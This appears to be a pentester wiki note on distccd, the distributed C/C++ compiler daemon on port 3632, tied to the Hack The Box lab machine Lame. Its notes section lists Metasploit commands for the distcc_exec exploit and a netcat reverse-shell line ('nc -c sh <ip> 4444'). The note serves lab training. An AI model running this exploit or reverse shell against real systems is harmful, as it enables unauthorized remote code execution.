# Distccd

<div class="row row-cols-lg-2"><div>

[Distccd](https://www.distcc.org/) stands for "Distributed Compiler Daemon." It's a program to speed up compilation by sharing the job between machines over the network. It is specific to compilation of C/C++ programs.

**Ports** 🐊: 3632 (TCP)

The last [release](https://github.com/distcc/distcc/releases) was released in 2021 🪦, but it's still updated.
</div><div>
</div></div>

<hr class="sep-both">

## Pentester Notes ☠️

[![lame](../../../../../cybersecurity/_badges/htb-p/lame.svg)](https://app.hackthebox.com/machines/Lame)

<div class="row row-cols-lg-2"><div>

You can try your luck with [metasploit](/cybersecurity/red-team/tools/frameworks/metasploit/index.md):

```shell!
$ msfconsole -q
msf6> exploit/unix/misc/distcc_exec
msf6> set RHOSTS <IP>
msf6> set LHOST tun0
msf6> show payloads
msf6> set payload 6
msf6> run
nc -c sh <ip> 4444
```

The user is `uid=1(daemon) gid=1(daemon) groups=1(daemon)`.
</div><div>
</div></div>